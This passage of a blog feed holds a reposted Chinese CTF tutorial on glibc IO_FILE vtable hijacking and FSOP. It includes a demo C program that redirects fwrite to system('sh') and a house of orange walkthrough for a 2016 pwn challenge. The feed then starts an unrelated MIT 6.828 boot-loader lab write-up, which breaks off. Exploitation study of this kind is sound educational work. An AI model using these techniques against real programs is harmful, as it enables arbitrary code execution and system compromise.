    <updated>2021-03-17T04:11:46.646Z</updated>
    
    <content type="html"><![CDATA[<p>转载来自<code>raycp</code>师傅的文章：<a href="https://xz.aliyun.com/t/5508">https://xz.aliyun.com/t/5508</a></p><p>之前的文章对IO FILE相关功能函数的源码进行了分析，后续将对IO FILE相关的利用进行阐述。</p><p>传送门：</p><ul><li><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis">IO FILE之fopen详解</a></p></li><li><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fread_analysis">IO FILE之fread详解</a></p></li><li><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis">IO FILE之fwrite详解</a></p></li><li><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis">IO_FILE之fclose详解</a></p></li></ul><p>经过了前面对fopen等源码的介绍，知道了IO FILE结构体里面有个很重要的数据结构–<code>vtable</code>，IO函数的很多功能都是通过它去实现的。接下来主要描述如何通过劫持vtable去实现控制函数执行流以及通过FSOP来进行利用。</p><h2 id="vtable劫持"><a href="#vtable劫持" class="headerlink" title="vtable劫持"></a>vtable劫持</h2><p>本文是基于libc 2.23及之前的libc上可实施的，libc2.24之后加入了vtable check机制，无法再构造vtable。</p><p>vtable是<code>_IO_FILE_plus</code>结构体里的一个字段，是一个函数表指针，里面存储着许多和IO相关的函数。</p><h2 id="劫持原理"><a href="#劫持原理" class="headerlink" title="劫持原理"></a>劫持原理</h2><p><code>_IO_FILE_plus</code>结构体的定义为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>vtable</code>对应的结构体<code>_IO_jump_t</code>的定义为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个函数表中有19个函数，分别完成IO相关的功能，由IO函数调用，如<code>fwrite</code>最终<code>__write</code>函数、<code>fread</code>会调用<code>__doallocate</code>来分配IO缓冲区等。</p><p>给出<code>stdin</code>的IO FILE结构体和它的虚表的值，更直观的看下，首先是<code>stdin</code>的结构体</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13090194716/0" alt="20190627085831-ae732ce4-9876-1"></p><p>可以看到此时的函数表的值是<code>0x7ce23cc576e0 &lt;__GI_IO_file_jumps&gt;</code>，查看它的函数：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13090208786/0" alt="20190627085851-bac08de8-9876-1"></p><p>vtable劫持的原理是：如果能够控制FILE结构体，实现对vtable指针的修改，使得vtable指向可控的内存，在该内存中构造好vtable，再通过调用相应IO函数，触发vtable函数的调用，即可程序执行流。</p><p>从原理中可以看到，劫持最关键的点在于修改IO FILE结构体的vtable指针，指向可控内存。一般来说有两种方式：一种是只修改内存中已有FILE结构体的vtable字段；另一种则是伪造整个FILE结构体。当然，两种的本质最终都是修改了vtable字段。</p><p>demo示例程序可以参考<a href="https://wiki.gdpcisa.org/pwn/io_file/fake-vtable-exploit/">ctf wiki</a>中的示例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个示例通过修改已有FILE结构体的内存的vtable，使其指向用户可控内存，实现劫持程序执行<code>system(&quot;sh&quot;)</code>的过程。</p><p>有了前面几篇文章对vtable调用的基础，劫持的原理理解就比较容易了，不再赘述。</p><h2 id="IO调用的vtable函数"><a href="#IO调用的vtable函数" class="headerlink" title="IO调用的vtable函数"></a>IO调用的vtable函数</h2><p>在这里给出<code>fopen</code>、<code>fread</code>、<code>fwrite</code>、<code>fclose</code>四个函数会调用的vtable函数，之前在每篇文章的末尾都会给出，在这里统一总结下，方便后面利用的时候能够较快的找到所需劫持的函数指针。</p><p><code>fopen</code>函数是在分配空间，建立FILE结构体，未调用vtable中的函数。</p><p><code>fread</code>函数中调用的vtable函数有：</p><ul><li><code>_IO_sgetn</code>函数调用vtable的<code>_IO_file_xsgetn</code>。</li><li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li><li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable中<code>__GI_IO_file_read</code>最终去执行系统调用read。</li></ul><p><code>fwrite</code>函数调用的vtable函数有：</p><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul><p><code>fclose</code>函数调用的vtable函数有：</p><ul><li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li><li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li><li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数，</li></ul><p>其他的IO函数功能相类似的调用的应该都差不多，可以参考下。</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP的全称是<code>File Stream Oriented Programming</code>，关键点在于前面<code>fopen</code>函数中描述过的<code>_IO_list_all</code>指针。</p><p>进程中打开的所有文件结构体使用一个单链表来进行管理，即通过<code>_IO_list_all</code>进行管理，在<code>fopen</code>的分析中，我们知道了fopen是通过<code>_IO_link_in</code>函数将新打开的结构体链接进入<code>_IO_list_all</code>的，相关的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">...</span><br><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp;</span><br></pre></td></tr></table></figure><p>从代码中也可以看出来链表是通过FILE结构体的<code>_chain</code>字段来进行链接的。</p><p>正常的进行中存在stderr、stdout以及stdin三个IO FILE，此时<code>_IO_list_all</code>如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13092653300/0" alt="stder"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13092654068/0" alt="stdout"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13092654861/0" alt="stdin"></p><p>形成的链表如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13092661132/0" alt="20190627090036-f9501556-9876-1"></p><p>看到链表的操作，应该就大致猜到了FSOP的主要原理了。即通过伪造<code>_IO_list_all</code>中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改<code>_IO_list_all</code>直接指向可控的地址。</p><p>具体来说该如何利用呢？glibc中有一个函数<code>_IO_flush_all_lockp</code>，该函数的功能是刷新所有FILE结构体的输出缓冲区，相关源码如下，文件在<code>libio\genops</code>中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)   <span class="comment">//，如果输出缓冲区有数据，刷新输出缓冲区</span></span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//遍历链表</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对<code>fwrite</code>分析，我们知道输出缓冲区的数据保存在<code>fp-&gt;_IO_write_base</code>处，且长度为<code>fp-&gt;_IO_write_ptr - _IO_write_base</code>，因此上面的<code>if</code>语句实质上是判断该FILE结构输出缓冲区是否还有数据，如果有则调用<code>_IO_OVERFLOW</code>去刷新缓冲区。其中<code>_IO_OVERFLOW</code>是vtable中的函数，因此如果我们可以控制<code>_IO_list_all</code>链表中的一个节点的话，就有可能控制程序执行流。</p><p>可以看出来该函数的意义是为了保证数据不流失，因此在程序执行退出相关代码时，会去调用函数去刷新缓冲区，确保数据被保存。根据<code>_IO_flush_all_lockp</code>的功能，猜测这个函数应该是在程序退出的时候调用的，因为它刷新所有FILE的缓冲区。事实上，会调用<code>_IO_flush_all_lockp</code>函数的时机包括：</p><ul><li>libc执行abort函数时。</li><li>程序执行exit函数时。</li><li>程序从main函数返回时。</li></ul><p>再多做一点操作，去看下上述三种情况的堆栈，来进一步了解程序的流程。将断点下在<code>_IO_flush_all_lockp</code>，查看栈结构。</p><p>首先是abort函数的流程，利用的double free函数触发，栈回溯为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">__GI_abort ()</span><br><span class="line">__libc_message (do_abort=do_abort@entry=<span class="number">0x2</span>, fmt=fmt@entry=<span class="number">0x7ffff7ba0d58</span> <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>)</span><br><span class="line">malloc_printerr (action=<span class="number">0x3</span>, str=<span class="number">0x7ffff7ba0e90</span> <span class="string">&quot;double free or corruption (top)&quot;</span>, ptr=&lt;optimized out&gt;, ar_ptr=&lt;optimized out&gt;)</span><br><span class="line">_int_free (av=<span class="number">0x7ffff7dd4b20</span> &lt;main_arena&gt;, p=&lt;optimized out&gt;,have_lock=<span class="number">0x0</span>)</span><br><span class="line">main ()</span><br><span class="line">__libc_start_main (main=<span class="number">0x400566</span> &lt;main&gt;, argc=<span class="number">0x1</span>, argv=<span class="number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe568</span>)</span><br><span class="line">_start ()</span><br></pre></td></tr></table></figure><p>exit函数，栈回溯为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br><span class="line">main ()</span><br><span class="line">__libc_start_main (main=<span class="number">0x400566</span> &lt;main&gt;, argc=<span class="number">0x1</span>, argv=<span class="number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe568</span>)</span><br><span class="line">_start ()</span><br></pre></td></tr></table></figure><p>程序正常退出，栈回溯为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br><span class="line">__libc_start_main (main=<span class="number">0x400526</span> &lt;main&gt;, argc=<span class="number">0x1</span>, argv=<span class="number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe568</span>)</span><br><span class="line">_start ()</span><br></pre></td></tr></table></figure><p>看出来程序正常从main函数返回后，也是调用<code>exit</code>函数，所以最终才调用<code>_IO_flush_all_lockp</code>函数的。</p><p>再说如何利用，利用的方式为：伪造IO FILE结构体，并利用漏洞将<code>_IO_list_all</code>指向伪造的结构体，或是将该链表中的一个节点（<code>_chain</code>字段）指向伪造的数据，最终触发<code>_IO_flush_all_lockp</code>，绕过检查，调用<code>_IO_OVERFLOW</code>时实现执行流劫持。</p><p>其中绕过检查的条件是输出缓冲区中存在数据：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br></pre></td></tr></table></figure><h2 id="示例–house-of-orange"><a href="#示例–house-of-orange" class="headerlink" title="示例–house of orange"></a>示例–house of orange</h2><p>FSOP的利用示例，最经典的莫过于<code>house of orange</code>攻击方法。下面将通过<code>house of orange</code>攻击方法具体体现vtable劫持和fsop，示例题是东华杯2016-pwn450的note。</p><p>先说明一下，程序中使用的<code>unsorted bin attack</code>改写<code>_IO_list_all</code>，使用<code>sysmalloc</code>得到<code>unsorted bin</code>的原理我不再详细描述，有需要的可以参考<a href="https://www.anquanke.com/post/id/85127">unsorted bin attack分析</a>，在这里主要集中在vtable的劫持以及FSOP的实现上。</p><p>题目是一道菜单题，可以创建、编辑、以及删除堆块，其中只允许同时对一个堆块进行操作，只有释放了当前堆块才可以申请下一个堆块。</p><p>在创建函数中，堆块被<code>malloc</code>出来后会打印堆的地址，可以使用该函数来泄露堆地址；漏洞在编辑函数中，编辑函数可以输入任意长的字符，因此可以造成堆溢出。</p><p>首先要解决如何实现地址泄露，正常来说通过创建函数可以得到堆地址，但是如何得到libc的地址？答案是可以通过申请大的堆块，申请堆块很大时，mmap出来的内存堆块会紧贴着libc，可通过偏移得到libc地址。从下图中可以看到，当申请堆块大小位0x200000时，申请出来的堆块紧贴libc，可通过堆块地址得到libc基址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13093036918/0" alt="20190627090106-0b3d81e0-9877-1"></p><p>如何得到unsorted bin？想要利用unsorted bin attack实现<code>_IO_list_all</code>的改写，那么就需要有unsorted bin才行，只有一个堆块，如何得到unsorted bin？答案是利用top chunk不足时堆的分配机制，当top chunk不足以分配，系统会分配新的top chunk并将旧的chunk使用free函数释放，此时会将堆块释放至unsorted bin中。我们可以利用覆盖，伪造top chunk的size，释放的堆块需满足下述条件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">          ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>即：</p><ol><li>size需要大于0x20（MINSIZE）</li><li>prev_inuse位为1</li><li>top chunk address + top chunk size 必须是页对齐的（页大小一般为0x1000）</li></ol><p>最终利用unsorted bin attack，将<code>_IO_list_all</code>指向<code>main_arena</code>中<code>unsorted_bins</code>数组的位置。</p><p>此时的<code>_IO_list_all</code>由于指向的是<code>main_arena</code>中的地址，并不是完全可控的。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13096333589/0" alt="20190627090131-1a0013d2-9877-1"></p><p>但是它的chain字段却是可控的，因为我们可以通过伪造一个大小为0x60的small bin释放到main_arena中，从而在unsorted bin attack后，该字段刚好被当作<code>_chain</code>字段，如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13096355394/0" alt="20190627090158-2a3ad4da-9877-1"></p><p>当调用<code>_IO_flush_all_lockp</code>时，<code>_IO_list_all</code>的头节点并不会使得我们可以控制执行流，但是当通过<code>fp = fp-&gt;_chain</code>链表，对第二个节点进行刷新缓冲区的时候，第二个节点的数据就是完全可控的。我们就可以伪造该结构体，构造好数据以及vtable，在调用vtable中的<code>_IO_OVERFLOW</code>函数时实现对控制流的劫持。</p><p>写exp时，可以利用<code>pwn_debug</code>中<code>IO_FILE_plus</code>模块中的<code>orange_check</code>函数来检查当前伪造的数据是否满足house of orange的攻击，以及使用<code>show</code>函数来显示当前伪造的FILE结构体。</p><p>伪造的IO FILE结构体如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13096362098/0" alt="fake file"></p><p>可以看到<code>_mode</code>为0，<code>_IO_write_ptr</code>也大于<code>fp-&gt;_IO_write_base</code>因此会触发它的_<code>IO_OVERFLOW</code>函数，它的vtable被全部伪造成<code>system</code>的地址，如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13096368155/0" alt="system"></p><p>最终执行system(“/bin/sh”)拿到shell。</p><p>vtable劫持和FSOP还是比较好理解的，下一篇将介绍vtable check机制和它的绕过方法。</p><p><a href="https://github.com/ray-cp/pwn_debug"><code>pwn_debug</code></a>新增了一个模块<code>IO_FILE_plus</code>，该模块可以很方便的查看和构造IO FILE结构体，以及检查结构体是否满足利用条件。本文中可以使用的api为<code>IO_FILE_plus.orange_check</code>，即检查当前构造的IO FILE是否满足house of orange的攻击条件。</p><p>exp和相关文件在我的<a href="https://github.com/ray-cp/ctf-pwn/tree/master/PWN_CATEGORY/IO_FILE/vtable_hajack/东华杯2016-pwn450_note">github</a>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;转载来自&lt;code&gt;raycp&lt;/code&gt;师傅的文章：&lt;a href=&quot;https://xz.aliyun.com/t/5508&quot;&gt;https://xz.aliyun.com/t/5508&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;之前的文章对IO FILE相关功能函数的源码进行了分析，后续
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="IO_FILE" scheme="https://billyotry.github.io/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab1-Exercise3</title>
    <link href="https://billyotry.github.io/2021/01/23/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise3/"/>
    <id>https://billyotry.github.io/2021/01/23/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise3/</id>
    <published>2021-01-23T08:01:07.155Z</published>
    <updated>2021-01-26T12:02:17.738Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-1-Exercise-3："><a href="#Lab-1-Exercise-3：" class="headerlink" title="Lab 1 Exercise 3："></a>Lab 1 Exercise 3：</h2><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>设置一个断点在地址0x7c00处，这是boot loader被加载的位置。然后让程序运行到这个直到这个断点。跟踪<code>boot/boot.S</code>文件的每一条指令，同时使用boot.S文件和系统为你反汇编出来的文件<code>obj/boot/boot.asm</code>。你也可以使用GDB的<code>x/i</code>指令来获取去任意一个机器指令的反汇编指令，把源文件boot.S文件和boot.asm文件以及在GDB反汇编出来的指令进行比较。</p><p>追踪到bootmain函数中，而且还要具体追踪到readsect()子函数里面。找出readsect() c语言程序的每一条语句所对应的汇编指令，回到bootmain()，然后找出把内核文件从磁盘读取到内存的那个for循环所对应的汇编语句。找出当循环结束后会执行哪条语句，在那里设置断点，继续运行到断点，然后运行完所有的剩下的语句。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>下面我们分别分析一下Exercise中涉及的两个重要文件，它们一起组成了boot loader。分别是<code>/boot/boot.S</code>和<code>/boot/main.c</code>文件。其中前者是一个汇编文件，后者是一个C语言文件。当BIOS运行完成后，CPU的控制权就转移到boot.S文件上，首先我们看一下boot.S文件。</p><h4 id="boot-boot-S"><a href="#boot-boot-S" class="headerlink" title="/boot/boot.S"></a>/boot/boot.S</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 .globl start</span><br><span class="line">2 start:</span><br><span class="line">3   .code16                # Assemble for 16-bit mode</span><br><span class="line">4   cli                    # Disable interrupts</span><br></pre></td></tr></table></figure><p>​    这几条指令是boot.S最开始的几句，其中cli是boot.S，同时也是boot loader的第一条指令。这条指令用于把所有的中断都关闭。因为BIOS运行期间有可能打开了中断。此时CPU工作在实模式下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5  cld                         # String operations increment</span><br></pre></td></tr></table></figure><p>​    这条指令用于指定发生的串处理操作的指针移动方向。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6  # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">7  xorw    %ax,%ax             # Segment number zero</span><br><span class="line">8  movw    %ax,%ds             # -&gt; Data Segment</span><br><span class="line">9  movw    %ax,%es             # -&gt; Extra Segment</span><br><span class="line">10 movw    %ax,%ss             # -&gt; Stack Segment</span><br></pre></td></tr></table></figure><p>​    这几条命令主要是把三个段寄存器ds，es，ss全部清零，因为经历了BIOS，操作系统不能保证这三个寄存器中存放的是什么数，这也是为进入保护模式做准备。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11  # Enable A20:</span><br><span class="line">12  #   For backwards compatibility with the earliest PCs, physical</span><br><span class="line">13  #   address line 20 is tied low, so that addresses higher than</span><br><span class="line">14  #   1MB wrap around to zero by default.  This code undoes this.</span><br><span class="line">15 seta20.1:</span><br><span class="line">16  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">17  testb   $0x2,%al                # test &#x3D; AND</span><br><span class="line">18  jnz     seta20.1</span><br><span class="line"></span><br><span class="line">19  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64</span><br><span class="line">20  outb    %al,$0x64</span><br><span class="line"></span><br><span class="line">21 seta20.2:</span><br><span class="line">22  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">23  testb   $0x2,%al</span><br><span class="line">24  jnz     seta20.2</span><br><span class="line"></span><br><span class="line">25  movb    $0xdf,%al               # 0xdf -&gt; port 0x60</span><br><span class="line">26  outb    %al,$0x60</span><br></pre></td></tr></table></figure><p>​    这部分指令就是在准备把CPU的工作模式从实模式转换为保护模式。我们可以看到其中的inb，outb这样的IO端口命令。所以这些指令都是在对外部设备进行操作。从下面链接查询：</p><p>​    <a href="http://bochs.sourceforge.net/techspec/PORTS.LST">http://bochs.sourceforge.net/techspec/PORTS.LST</a></p><p>​    我们可以知道，0x64端口属于键盘控制器804x，名称是控制器读取状态寄存器。下面是各个位的含义</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13075840553/0" alt="image-20210123170158800"></p><p>​    所以16 ~ 18号指令是在不断的检测bit1。bit1的值代表了输入缓冲区是否满了，也就是说CPU传送给控制器的数据，控制器是否已经取走了，如果CPU想向控制器传送新的数据的话，必须先保证这一位为0。所以这三条指令会一直等待这一位变为0，才能继续向后运行。</p><p>​    当0x64端口准备好读入数据后，现在就可以写入数据了，所以19 ~ 20这两条指令是把0xd1这条数据写入到0x64端口中。当向0x64端口写入数据时，则代表向键盘控制器804x发送指令。这个指令将会被送给0x60端口。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13077104980/0" alt="image-20210123221339018"></p><p>​    通过图中可见，D1指令代表下一次写入0x60端口的数据将被写入给804x控制器的输出端口。可以理解为下一个写入0x60端口的数据是一个控制指令。</p><p>​    然后21 ~ 24号指令又开始再次等待，等待刚刚写入的指令D1，是否已经被读取了。</p><p>​    如果指令被读取了，25 ~ 26号指令会向控制器输入新的指令，0xdf。通过查询我们可以看到0xdf指令的含义如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13077116122/0" alt="image-20210123221731103"></p><p>​    指令的含义是使能A20线，代表可以进入保护模式了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">27   # Switch from real to protected mode, using a bootstrap GDT </span><br><span class="line">28   # and segment translation that makes virtual addresses  </span><br><span class="line">29   # identical to their physical addresses, so that the  </span><br><span class="line">30   # effective memory map does not change during the switch. </span><br><span class="line">31   lgdt    gdtdesc </span><br></pre></td></tr></table></figure><p>​    首先31号指令是把gdtdesc这个标识符的值送入全局映射描述符表寄存器GDTR中。这个GDT表是处理器工作于保护模式下一个非常重要的表。具体参照appendx文章中关于实模式和保护模式的介绍。至于这条指令的功能就是把关于GDT表的一些重要信息存放到CPU的GDTR寄存器中，其中包括GDT表的内存起始位置，以及GDT表的长度。这个寄存器由48位组成，其中低16位标识该表长度，高32位表示GDT表在内存中的起始地址。所以gdtdesc是一个标识符，标识着一个内存地址。从这个内存地址开始之后的6个字节中存放着GDT表的长度和起始地址。我们可以在文件末尾看到gdtdesc：</p><figure class="highlight 